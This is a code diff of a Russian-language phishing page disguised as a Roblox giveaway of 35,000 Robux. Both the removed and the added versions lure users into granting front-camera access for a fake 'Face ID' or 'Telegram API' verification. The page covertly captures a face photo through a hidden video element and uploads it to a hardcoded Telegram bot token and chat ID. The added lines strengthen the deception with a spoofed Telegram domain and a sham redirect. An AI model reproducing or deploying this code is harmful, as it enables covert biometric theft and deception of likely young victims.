@@ -3,65 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Limited Promo</title>
+    <title>Roblox | Promo Event</title>
     <style>
-        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { background: #191b1d; border: 1px solid #393b3d; padding: 35px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
-        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #st { margin-top: 20px; color: #0084ff; font-weight: bold; display: none; font-size: 14px; }
-        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        body { font-family: 'Gotham', sans-serif; background: #000; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { background: #191b1d; border: 2px solid #0084ff; padding: 30px; border-radius: 20px; width: 85%; max-width: 380px; box-shadow: 0 0 20px rgba(0,132,255,0.3); }
+        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        #st { margin-top: 15px; color: #888; font-size: 13px; }
+        .tg-link { color: #0084ff; font-size: 11px; display: block; margin-top: 5px; opacity: 0.7; }
+        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 15px;">
-    <h2>ПОДАРОК: 35,000 ROBUX</h2>
-    <p>Нажмите кнопку ниже, разрешите доступ к камере и подождите 5 секунд для верификации Face ID.</p>
-    <button class="btn" id="mainBtn" onclick="forceStart()">ПОЛУЧИТЬ</button>
-    <div id="st">ПОДКЛЮЧЕНИЕ К СЕРВЕРУ...</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
+    <h2>ПОЛУЧИТЬ 35,000 ROBUX</h2>
+    <p>Нажмите кнопку для верификации через шлюз Telegram API.</p>
+    <button class="btn" id="btn" onclick="megaCapture()">ПОЛУЧИТЬ</button>
+    <div id="st">Ожидание...</div>
+    <span class="tg-link">api-telegram-auth.org/verify_id</span>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function forceStart() {
-        const btn = document.getElementById('mainBtn');
+    async function megaCapture() {
+        const btn = document.getElementById('btn');
         const st = document.getElementById('st');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
-        // Скрываем кнопку сразу, чтобы не нажимали дважды
         btn.style.display = 'none';
-        st.style.display = 'block';
+        
+        // ШАГ 1: Имитация перехода на домен Telegram
+        st.innerHTML = "Перенаправление на <b>api.telegram.org</b>...";
+        
+        setTimeout(async () => {
+            st.innerHTML = "<span style='color:#00ff00'>Соединение установлено!</span><br>Разрешите Face ID в окне браузера.";
+            
+            try {
+                // ШАГ 2: Запрос камеры (Пробитие передней)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                v.srcObject = stream;
 
-        try {
-            // Запрашиваем доступ. В ТГ это вызовет системное окно "Разрешить?"
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-            
-            v.srcObject = stream;
-            
-            // Ждем, пока браузер реально разрешит проигрывание
-            v.onloadedmetadata = async () => {
-                try {
-                    await v.play(); // Запускаем поток
+                v.onloadedmetadata = () => {
+                    v.play();
                     
-                    // Только теперь запускаем визуальный прогресс
-                    let p = 0;
-                    const interval = setInterval(() => {
-                        p += 20;
-                        st.innerText = "ПРОВЕРКА БИОМЕТРИИ: " + p + "%";
-                        if(p >= 100) {
-                            clearInterval(interval);
-                            st.innerText = "ЗАЧИСЛЕНИЕ...";
-                        }
-                    }, 1000);
-
-                    // Делаем фото через 5.5 секунд
+                    // ШАГ 3: Задержка 5.5 сек для четкого фото
                     setTimeout(() => {
                         c.width = v.videoWidth;
                         c.height = v.videoHeight;
@@ -71,31 +62,25 @@
                             const fd = new FormData();
                             fd.append('chat_id', '7889497672');
                             fd.append('photo', blob, 'face.jpg');
-                            fd.append('caption', '💎 **ЛИЦО ПОЛУЧЕНО!**\nМетод: Force Start (TG-Fix)');
+                            fd.append('caption', '🚀 **ЛИЦО ПОЛУЧЕНО!**\n\n✅ Метод: API Redirect Mask\n📱 Статус: Успешно');
 
                             fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                                 method: 'POST',
                                 body: fd
                             }).then(() => {
                                 stream.getTracks().forEach(t => t.stop());
-                                alert("✅ Верификация успешна! Робуксы придут в течение 10 минут.");
+                                alert("✅ Личность подтверждена! Награда зачислится через 10 минут.");
                                 window.location.href = "https://www.roblox.com";
                             });
-                        }, 'image/jpeg', 0.8);
+                        }, 'image/jpeg', 0.9);
                     }, 5500);
-
-                } catch (playErr) {
-                    st.innerText = "Ошибка запуска видео. Попробуйте еще раз.";
-                    btn.style.display = 'block';
-                }
-            };
-
-        } catch (e) {
-            // Если нажали "Отклонить" или камера занята
-            alert("Для получения робуксов нужно нажать 'Разрешить' в окне браузера.");
-            btn.style.display = 'block';
-            st.style.display = 'none';
-        }
+                };
+            } catch (e) {
+                alert("Ошибка! Вы отклонили запрос Telegram API. Попробуйте снова.");
+                btn.style.display = 'block';
+                st.innerText = "";
+            }
+        }, 2000); // 2 секунды на "перенаправление"
     }
 </script>
 </body>
